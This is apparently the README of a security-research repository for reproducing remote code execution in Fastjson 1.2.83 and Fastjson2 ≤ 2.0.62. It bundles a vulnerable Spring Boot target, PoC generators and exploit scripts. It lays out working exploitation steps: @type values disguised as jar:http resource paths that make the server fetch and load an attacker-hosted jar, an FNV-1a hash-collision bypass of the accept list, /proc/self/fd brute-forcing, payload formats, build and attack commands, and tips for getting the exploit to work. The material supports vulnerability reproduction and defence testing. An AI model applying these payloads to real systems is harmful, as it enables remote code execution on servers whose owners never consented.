# Fastjson 1.2.83 / Fastjson2 2.0.62 RCE 研究环境

对 **Fastjson 1.2.83（CVE-2026-16723）** 与 **Fastjson2 ≤ 2.0.62** 远程代码执行漏洞的学习与复现环境，包含：

- 一个可复现漏洞的 **Spring Boot 靶场**（`/parse/1283`、`/parse/2062`）
- 一套生成恶意 jar + payload 的 **PoC 工具**（`poc/`，javassist 生成字节码）
- 一键攻击脚本 `exp_1283.py` / `exp_2062.py`

> ⚠️ **仅限授权环境 / 本地靶场测试**。本项目仅用于安全研究、漏洞复现与防御验证，禁止用于未授权系统。

---

## 目录结构

```
fastjson/
├── pom.xml                        # 靶场 Maven 配置（fastjson 1.2.83 + fastjson2 2.0.62, Spring Boot 2.7.18）
├── src/main/java/com/example/
│   ├── Application.java           # 靶场入口
│   └── controller/ParseController.java  # /parse/1283、/parse/2062
├── poc/                           # PoC 工具（独立 Maven 项目）
│   ├── code_to_run.txt            # 要执行的代码（所有工具从这里读取）
│   ├── pom.xml                    # 依赖: javassist 3.29.2-GA, picocli 4.7.6
│   └── src/main/java/
│       ├── utils/                 # 通用代码
│       │   ├── JavassistGen.java  # javassist 生成恶意类（可选 @JSONType 注解）
│       │   ├── CodeLoader.java    # 读 code_to_run.txt + try-catch 包裹
│       │   ├── PocIO.java         # 写 jar / 文本
│       │   ├── Fnv.java           # FNV-1a 哈希
│       │   └── JsonUtil.java      # JSON 转义工具
│       ├── poc_1283/              # fastjson 1.2.83 工具
│       │   ├── GenHttpProbe.java  # 一阶段 jar:http
│       │   └── GenFileProbe.java  # 二阶段 fd1~fd100 爆破
│       └── poc_2062/              # fastjson2 2.0.62 工具
│           └── PocGenerator.java  # FNV 碰撞 + jar:http / jar:file 生成
├── exp_1283.py                    # 1.2.83 fd 爆破攻击脚本
├── exp_2062.py                    # fastjson2 攻击脚本
├── hash_collision.py              # FNV-1a 碰撞求解器（换 IP/端口重算碰撞）
└── poc/artifacts/                 # 攻击产物（gitignore，不提交）
    ├── 1283/                      # probe, probe_file, http/fd-payload.txt
    └── 2062/                      # http-x, fd-x, *-payload.json/.txt
```

## 漏洞背景

### Fastjson 1.2.83（CVE-2026-16723）

`ParserConfig.checkAutoType` 解析 `@type` 时，把类名 `replace('.','/') + ".class"` 交给 ClassLoader 做**资源探测**，并检查字节码是否带 `@JSONType` 注解。攻击者可把 `@type` 伪装成资源路径：

```
@type = jar:http:..<IP_INT>:<PORT>.<jar>!.POC
     ↓ replace('.','/')
资源  = jar:http://<IP>:<PORT>/<jar>!/POC.class
```

- **下载**（`getResourceAsStream`）走 `LaunchedURLClassLoader`（fatjar）→ 支持 `jar:` 协议 → 远程下载
- **加载**（`TypeUtils.loadClass`）能否完成取决于 TCCL 是否支持 `jar:http`/`jar:file` 类加载

| 路径 | 条件 |
|---|---|
| 一阶段 `jar:http://` | **JDK 8** + fatjar + loadClass 走 Launched |
| 二阶段 `jar:file:/proc/self/fd/N` | **Linux** + **JDK 8 / 9+ 均可用**（类名无 `//`） |

### Fastjson2 ≤ 2.0.62（FNV 哈希碰撞 + DynamicClassLoader）

`ObjectReaderProvider.checkAutoType` 在 `autoTypeSupport=false` 时，也会对 `@type` 做**增量 FNV-1a 白名单匹配**：逐字符算 hash，任意前缀命中 `acceptHashCodes`（默认含硬编码 `-6293031534589903644L` = `0xA8AAA929446FFCE4`，对应 `AntiCollisionHashMap`）即 `loadClass(完整 typeName)`，且**不校验前缀文本** → 可构造哈希碰撞。

- 碰撞后 `TypeUtils.loadClass` 依次尝试 `TCCL`（Tomcat 不支持 `jar:http`，失败）→ **`JSON.class.getClassLoader()`（LaunchedURLClassLoader，支持 `jar:http`）** → 下载 jar + defineClass
- **实例化**时 fastjson2 用 ASM 动态 reader（`ORG_1_0_Exception`），`DynamicClassLoader`（parent = `getSystemClassLoader()` = AppClassLoader）看不到 Launched 定义的类 → `ClassNotFoundException`
- **修复**：`Thread.currentThread().setContextClassLoader(JSON.class.getClassLoader())`，让 `DynamicClassLoader` 的 TCCL fallback 能找到类

payload 格式（`.Exception` 后缀不影响碰撞命中，碰撞在碰撞串末尾即 return）：

```
jar:http:..<IP_INT>:<PORT>.x!.<碰撞>.Exception
jar:file:.proc.self.fd.N!.<碰撞>.Exception
```

**触发入口**：`JSON.parse` **数组** `[{@type:...}]` 或 `JSON.parseObject(x, Object.class)` **对象** `{@type:...}`；`JSON.parse` 顶层对象/holder 不触发（Map 路径）。

## 快速开始

### 1. 靶场

```bash
mvn package -DskipTests
java -jar target/fastjson-1.0-SNAPSHOT.jar
# 监听 4125，入口 POST /parse/1283（fastjson1）与 POST /parse/2062（fastjson2，带 ?isParseObject=false）
```

### 2. 写要执行的代码

```bash
# 编辑 poc/code_to_run.txt，例如（Linux 验证用）：
#   Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","touch /tmp/pwned"});
```

### 3. 生成攻击 jar（编译一次）

```bash
cd poc
mvn package -DskipTests
mvn -q dependency:build-classpath -Dmdep.outputFile=cp.txt
CP="target/classes;$(cat cp.txt)"
```

**fastjson 1.2.83**：
```bash
# 一阶段 jar:http（输出 artifacts/1283/probe + http-payload.txt）
java -cp "$CP" poc_1283.GenHttpProbe --host 192.168.50.1 --port 11111 --jar probe
# 二阶段 fd 爆破（输出 artifacts/1283/probe_file + fd-payload.txt）
java -cp "$CP" poc_1283.GenFileProbe
```

**fastjson2 2.0.62**（先跑碰撞，或用附带的 fd 碰撞表）：
```bash
# 一阶段 jar:http（输出 artifacts/2062/http-x + http-payload.txt）
java -cp "$CP" poc_2062.PocGenerator --mode http
# 二阶段 fd 爆破（输出 artifacts/2062/fd-x + fd-payload.txt；--shape 支持 list/object/holder/map）
java -cp "$CP" poc_2062.PocGenerator --mode fd --host 2130706433 --shape list
```

> `--mode fd` 的 `--host`/`--port` 决定 stage 的 `jar:http` 前缀（攻击机 HTTP 服务），碰撞后缀需与之匹配。

### 4. 攻击

```bash
# fastjson 1.2.83 二阶段 fd 爆破
python3 exp_1283.py --url http://192.168.50.2:4125/parse/1283

# fastjson2（--jar/--payload 默认取 artifacts/2062 对应文件）
python3 exp_2062.py --jar poc/artifacts/2062/http-x \
    --payload poc/artifacts/2062/http-payload.txt \
    --url "http://192.168.50.2:4125/parse/2062?isParseObject=false"
```

exp 脚本会自动：把 jar 复制为 `x`、起本地 HTTP 服务托管 `x`、从 payload 文件读 JSON（可能多行，逐行发送）。

## 已知坑

- **javassist 必须 ≥ 3.27**：老版本不生成 `StackMapTable`，JDK8 字节码校验报 `Illegal class name`。
- **恶意 jar 必须用 ASM/javassist 生成**：`this_class` 是 `jar:` 开头的非法 Java 类名，`javac` 编不了。
- **一阶段 IP 用整数**（`127.0.0.1` → `2130706433`），避免被 `replace('.','/')` 破坏。
- **碰撞后缀绑定 IP/端口**：换 IP/端口需重新算碰撞（`hash_collision.py`）。
- **fastjson2 需设 TCCL**：`JSON.parse` 数组路径在 Tomcat 下需 `setContextClassLoader(JSON.class.getClassLoader())`，否则 `DynamicClassLoader` 报 `ClassNotFoundException`。
- **每次测试前重启靶场**，JVM 会缓存 jar URL / 类加载结果。
- **`JSON.parse` 顶层对象/holder 不触发**，只能用数组 `[{@type:...}]`。

## License

暂无，仅供学习研究。
